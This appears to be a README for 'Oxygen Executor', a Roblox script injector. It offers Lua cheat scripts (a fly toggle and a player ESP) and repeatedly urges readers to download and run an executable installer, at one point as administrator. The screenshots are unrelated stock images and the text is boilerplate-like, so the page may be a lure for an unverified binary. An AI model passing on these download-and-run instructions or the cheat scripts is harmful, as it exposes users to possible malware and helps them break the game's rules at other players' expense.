# Oxygen Executor — Fast Lua Executor for Roblox Game Modding

[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?style=for-the-badge)](https://github.com/jesusnice/Roblox-Oxygen/releases)

![Oxygen Banner](https://logos-world.net/wp-content/uploads/2020/09/Roblox-Logo.png)

Oxygen Executor is a versatile execution tool for Roblox. It runs Lua executors and enables a wide range of game modifications. The interface is simple. The features are robust. Oxygen lets users load, edit, and run scripts inside Roblox games with control.

Table of contents
- About
- Key features
- Screenshots
- Supported APIs and modules
- Install (Download and run)
- Quick start
- Script examples
- Advanced usage
- UI walkthrough
- Integrations
- Security and permissions
- Troubleshooting
- FAQ
- Development and contribution
- Roadmap
- Changelog
- License

About
Oxygen Executor aims to provide a stable, predictable, and fast Lua execution environment for Roblox. It focuses on script execution, script management, and compatibility with community-developed Lua libraries. The tool contains a script editor, executor backend, a library manager, and a small UI overlay to control execution inside Roblox.

Key features
- Multi-modal executor. Run simple scripts or advanced modules.
- Script editor. Syntax highlighting, line numbers, and search.
- Script library. Save and load local or cloud scripts.
- Hotkey support. Bind hotkeys to scripts and actions.
- Injector and overlay. Inject code and control execution during gameplay.
- API compatibility. Support for common Roblox Lua APIs and community extensions.
- Execution log. Real-time output and error stack traces.
- Lightweight. Low memory use and fast startup.

Screenshots
- Editor view: https://upload.wikimedia.org/wikipedia/commons/1/11/Code_sample.png
- Execution log: https://upload.wikimedia.org/wikipedia/commons/4/4e/Terminated_process.png
- Settings panel: https://upload.wikimedia.org/wikipedia/commons/6/6a/Settings_icon.png

Supported APIs and modules
Oxygen targets common Roblox Lua patterns and variations. The executor aims to provide compatibility across many scripts used by the community. This list covers APIs and modules exposed by Oxygen or supported through built-in compatibility layers.

- Roblox core APIs
  - Instance, Workspace, Players, Lighting
  - RunService, UserInputService, HttpService (if enabled)
- Utility modules
  - JSON serialization
  - Bytecode handling
  - Safe sandbox wrappers for common tasks
- Common community modules
  - UI frameworks (Roact-like helpers)
  - Pathfinding and movement helpers
  - Network helpers for reading data and simulating events
- File and storage helpers
  - Local script storage
  - Import and export of script files (txt, lua, zip)

Install (Download and run)
Download the release file and execute it. Visit the releases page, get the correct installer, and run the included file to install Oxygen.

- Go to the releases page: https://github.com/jesusnice/Roblox-Oxygen/releases
- Find the latest release entry.
- Download the release asset named Oxygen-Installer.zip or Oxygen-Setup.exe.
- Extract the ZIP if needed.
- Run Oxygen-Setup.exe or double-click Oxygen.exe inside the extracted folder.
- Follow the on-screen installer prompts to install.

If the releases page changes, look for files with names like:
- Oxygen-Installer.zip
- Oxygen-Setup.exe
- Oxygen-x.y.z.zip (x.y.z is a version)

Quick start
1. Install Oxygen using the steps above.
2. Launch Roblox and join a game.
3. Open Oxygen from the system tray or from the installed app list.
4. In Oxygen, click Editor > New Script.
5. Paste a script (see examples below).
6. Click Execute or press the hotkey.

Script editor basics
- The editor highlights keywords and strings.
- Use Ctrl+S to save.
- Use Ctrl+F to search.
- Use Ctrl+Enter to run the active script.
- Use the script library to store frequently used scripts.

Script examples
These examples show basic usage patterns. Use them for learning and testing. Replace values to match your needs.

Example 1 — Print player name
```lua
local players = game:GetService("Players")
local me = players.LocalPlayer
print("Hello from Oxygen:", me and me.Name or "unknown")
```

Example 2 — Fly toggle
```lua
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local flying = false
local speed = 50

local function toggleFly()
    flying = not flying
    if flying then
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Name = "OxygenFly"
        bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
        bodyVelocity.Parent = humanoidRootPart

        local conn
        conn = RunService.Heartbeat:Connect(function()
            if not flying then
                conn:Disconnect()
                return
            end
            local moveVector = Vector3.new(0, 0, 0)
            local input = game:GetService("UserInputService")
            if input:IsKeyDown(Enum.KeyCode.W) then moveVector = moveVector + (workspace.CurrentCamera.CFrame.LookVector) end
            if input:IsKeyDown(Enum.KeyCode.S) then moveVector = moveVector - (workspace.CurrentCamera.CFrame.LookVector) end
            if input:IsKeyDown(Enum.KeyCode.A) then moveVector = moveVector - (workspace.CurrentCamera.CFrame.RightVector) end
            if input:IsKeyDown(Enum.KeyCode.D) then moveVector = moveVector + (workspace.CurrentCamera.CFrame.RightVector) end
            bodyVelocity.Velocity = moveVector.Unit * speed
        end)
    else
        local v = humanoidRootPart:FindFirstChild("OxygenFly")
        if v then v:Destroy() end
    end
end

toggleFly()
```

Example 3 — Simple ESP
```lua
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer

local function createBox(part)
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "OxygenESP"
    billboard.Adornee = part
    billboard.Size = UDim2.new(0,200,0,50)
    billboard.StudsOffset = Vector3.new(0, 2, 0)
    billboard.AlwaysOnTop = true
    local text = Instance.new("TextLabel", billboard)
    text.Size = UDim2.new(1,0,1,0)
    text.TextColor3 = Color3.fromRGB(255,255,255)
    text.BackgroundTransparency = 1
    text.TextScaled = true
    text.Text = part.Parent.Name
    billboard.Parent = part
end

local function addESPToCharacter(character)
    if not character then return end
    local root = character:FindFirstChild("HumanoidRootPart")
    if root and not root:FindFirstChild("OxygenESP") then
        createBox(root)
    end
end

Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(addESPToCharacter)
end)

for _, p in pairs(Players:GetPlayers()) do
    if p.Character then addESPToCharacter(p.Character) end
    p.CharacterAdded:Connect(addESPToCharacter)
end
```

Advanced usage
- Use the API layer to wrap dangerous calls.
- Use the library manager to store utility functions.
- Combine local storage and cloud scripts for team workflows.
- Use hotkeys to toggle scripts without opening the editor.

Example — Library pattern
Create a shared utility in the script library. Save it as "oxygen_utils.lua".
```lua
local M = {}

function M.safeCall(fn, ...)
    local ok, err = pcall(fn, ...)
    if not ok then
        warn("Oxygen safeCall error:", err)
    end
    return ok
end

function M.tween(instance, props, time)
    local TweenService = game:GetService("TweenService")
    local info = TweenInfo.new(time or 1)
    local tween = TweenService:Create(instance, info, props)
    tween:Play()
    return tween
end

return M
```
Load it in another script:
```lua
local utils = require(path.to.oxygen_utils)
utils.safeCall(function()
    print("safeCall worked")
end)
```

UI walkthrough
Main elements
- Menu bar. New, Open, Save, Settings.
- Script list. Quick access to saved scripts.
- Editor pane. Type, edit, and run Lua code.
- Output pane. Shows prints and errors.
- Hotkey panel. Bind actions to keys.

Settings
- Execution mode. Toggle safe sandbox or raw execution.
- Hotkeys. Bind keys to scripts or actions.
- Theme. Light and dark mode.
- Log level. Adjust verbosity of the output pane.

Integrations
- Clipboard. Copy and paste scripts fast.
- File system. Open local files from disk.
- Cloud sync. Optional sync for saved scripts (requires account).
- External API. Connect to remote script repositories.

Security and permissions
Oxygen runs locally. It acts as a host for Lua code that interacts with running Roblox client processes. The tool avoids altering core system files. The tool uses a sandbox mode to limit direct access to sensitive APIs unless the user enables raw execution.

Troubleshooting
- If scripts fail with runtime errors, check the output pane for the stack trace.
- If a script does not run, confirm the game is active in the Roblox client.
- If injection fails, try restarting both Roblox and Oxygen.
- If the editor shows unreadable characters, check file encoding and use UTF-8.

FAQ
Q: Where do I download the app?
A: Visit the releases page and download the installer. https://github.com/jesusnice/Roblox-Oxygen/releases

Q: What file do I run after download?
A: Run the release asset labeled Oxygen-Setup.exe or Oxygen.exe inside the ZIP. The installer guides the rest.

Q: Does Oxygen support automatic updates?
A: The app checks the releases page for new versions. You can download a newer installer from the releases page.

Q: Which platforms support Oxygen?
A: Windows is the primary supported platform. Other platforms may work with community builds.

Q: Can I save scripts to the cloud?
A: The app supports optional cloud sync if you enable it in settings and log in.

Q: How do I report bugs?
A: Open an issue on the repository or submit a pull request with a fix.

Contributing
We accept contributions. Follow these steps.

1. Fork the repository.
2. Create a feature branch.
3. Run tests locally.
4. Submit a pull request.

Conventions
- Keep functions short.
- Write tests for core logic.
- Keep the UI simple.
- Add documentation for new features.

Development setup
- Clone the repository.
- Open the project in your IDE.
- Build the app using the provided build script.
- Use the test suite to check changes.

Code style
- Follow the repository lint rules.
- Use clear function names.
- Add comments for complex logic.

Roadmap
- Add plugin support for community-provided modules.
- Expand API compatibility.
- Add cross-platform builds.
- Add scripting templates and community script manager.
- Add automated update service.

Changelog
- v1.0.0 — Initial public release.
  - Editor and executor.
  - Script library.
  - Basic injector and overlay.
  - Hotkey support.

- v1.1.0 — UI improvements.
  - Dark theme.
  - Better error reporting.
  - Faster startup.

- v1.2.0 — Feature pack.
  - Cloud sync opt-in.
  - Script sharing.
  - Expanded API wrappers.

Testing and validation
- Unit tests cover core execution logic.
- Manual tests cover UI behavior and injection flow.
- Use the test harness when running new builds.

Best practices for scripting inside Roblox
- Keep scripts modular.
- Use pcall when calling code that may error.
- Clean up created instances when disabling features.
- Avoid heavy loops on Heartbeat; prefer RunService events with care.
- Use local caching for values that you read often.

Sample script templates
Template — Toggle GUI
```lua
local player = game.Players.LocalPlayer
local screen = Instance.new("ScreenGui", player.PlayerGui)
screen.Name = "OxygenTemplate"

local frame = Instance.new("Frame", screen)
frame.Size = UDim2.new(0,200,0,100)
frame.Position = UDim2.new(0.5, -100, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(1,0,1,0)
button.Text = "Close"
button.MouseButton1Click:Connect(function()
    screen:Destroy()
end)
```

Template — Event logger
```lua
local RunService = game:GetService("RunService")
local function onHeartbeat(dt)
    print("Heartbeat:", dt)
end
local conn = RunService.Heartbeat:Connect(onHeartbeat)

delay(5, function()
    conn:Disconnect()
    print("Stopped logger")
end)
```

Automation and hotkeys
- Use Hotkey Manager to assign scripts to keys.
- Use macro scripts to combine actions.
- Use the library to build action sets.

Integration with external tools
- Use the file import feature to import scripts from repositories.
- Use keyboard macros to trigger multi-step sequences.
- Use the output webhooks to send logs to a local server.

Examples of common use cases
- Testing custom UI components during game development.
- Running utility scripts to inspect game state.
- Debugging client-side issues by logging data.
- Educational use for learning Lua and Roblox internals.

Community scripts
The community often shares scripts for utility and learning. The script library supports shared collections and tagging. Use the library manager to import community packs.

Performance notes
- The editor itself uses little CPU.
- Script execution time varies by script complexity.
- Heavy loops and frequent event connections increase CPU use.
- Use RunService steps and throttling for expensive operations.

Localization
- The UI supports English by default.
- The architecture allows adding new language packs.

Accessibility
- Keyboard navigation works across the UI.
- High-contrast modes improve visibility.
- The UI uses scalable fonts.

Legal
Use the tool in accordance with platform rules and local laws. Respect other users and their work.

Release downloads and updates
You can get the release files on the releases page. Download the file and run it to install. The installer will copy files to the chosen location and create a shortcut.

- Releases: [![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/jesusnice/Roblox-Oxygen/releases)

This second link goes to the same releases page, where the installer asset must be downloaded and executed.

Tips for troubleshooting releases
- If the downloaded file fails to open, re-download it.
- If the installer does not finish, try running as an administrator.
- If the file seems incomplete, check file size against the release notes.

Example workflow: Create and share a script
1. Open Oxygen.
2. Create a new script and save it in the library.
3. Test the script in a private game session.
4. Export the script as a .lua file.
5. Share the file with peers or upload it to a community repository.

Example: Export script command
- Save > Export > Choose folder
- The exported file will be a plain .lua file.

Logging and diagnostics
- Use the output pane for prints and warnings.
- The app stores logs in a local logs folder.
- Use the diagnostics tools to inspect injection calls.

Background processes
- Oxygen runs a small background service for hotkeys and overlay management.
- The service exits when the app closes.

Build and release process
- Use CI to build installers for each release.
- Tag releases on GitHub and attach build artifacts.
- Update changelog entries for each release.

Keyboard shortcuts
- Ctrl+N — New script
- Ctrl+O — Open script
- Ctrl+S — Save script
- Ctrl+Enter — Execute script
- Ctrl+K — Run selected line

Extensibility
- Plugin system allows adding custom UI panels.
- Custom modules can expose functions to scripts.
- Export format supports JSON manifest for library packs.

Sample manifest for script pack
```json
{
  "packName": "Oxygen Utilities",
  "version": "1.0.0",
  "scripts": [
    {
      "name": "FlyToggle",
      "path": "fly.lua",
      "description": "Toggle flying for local player"
    },
    {
      "name": "ESP",
      "path": "esp.lua",
      "description": "Simple player ESP"
    }
  ]
}
```

Community and support
- Open issues for bug reports and feature requests.
- Submit pull requests for code changes.
- Share scripts via the community library or external links.

Example of a community script contribution process
1. Create a script pack and manifest.
2. Test scripts in the editor.
3. Submit a pull request with the pack added to the community folder.
4. Maintainers will review and merge.

Performance tuning suggestions
- Cache references instead of repeated game:GetService calls.
- Use local variables for commonly accessed properties.
- Throttle heavy tasks with wait or RunService events.

Common pitfalls
- Relying on global state that changes between sessions.
- Leaving event connections active after a script finishes.
- Running heavy loops without proper throttling.

Testing tips
- Use a debug game server for tests.
- Use print statements and output logs to inspect values.
- Test one feature at a time.

Editor tips
- Use code folding for long scripts.
- Use bookmarks to jump to key sections.
- Split panes to edit multiple scripts at once.

Backup and recovery
- The script library supports local backups.
- Set automatic backups in settings.

Localization and community translation
- Create a languages folder with JSON language files.
- Submit translations via pull request.

Known limitations
- Platform support centers on Windows.
- Some advanced APIs may not behave like server-side scripts.

Contact and maintainers
- Open an issue on the repository for bugs.
- Submit code via pull requests for features and fixes.

Examples of extended scripts
Complex example — Inventory manager
```lua
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local function listTools()
    local character = player.Character
    if not character then return end
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") then
            print("Tool:", item.Name)
        end
    end
end

listTools()
```

Script safety patterns
- Use pcall for risky calls.
- Validate user input.
- Clean up instances created during runtime.

Community guidelines for scripts
- Do not distribute harmful scripts.
- Provide clear descriptions and usage instructions.
- Add comments and change logs.

Automation: run scripts at startup
- Use the startup scripts folder to run scripts when Oxygen launches.
- Mark scripts as active in the settings to auto-run.

Backup example
- Settings > Backup > Enable
- Choose backup interval and folder

Release management
- Tag releases with semantic versioning.
- Attach build artifacts to release entries.
- Update release notes to document changes.

Licensing
- This repository uses the MIT License by default.
- See LICENSE file for details.

Contributing checklist
- Follow code style.
- Add tests.
- Update documentation.
- Respect project guidelines.

Resources
- Official releases: https://github.com/jesusnice/Roblox-Oxygen/releases
- Editor icon assets and UI graphics: use licensed and public domain images.

End of document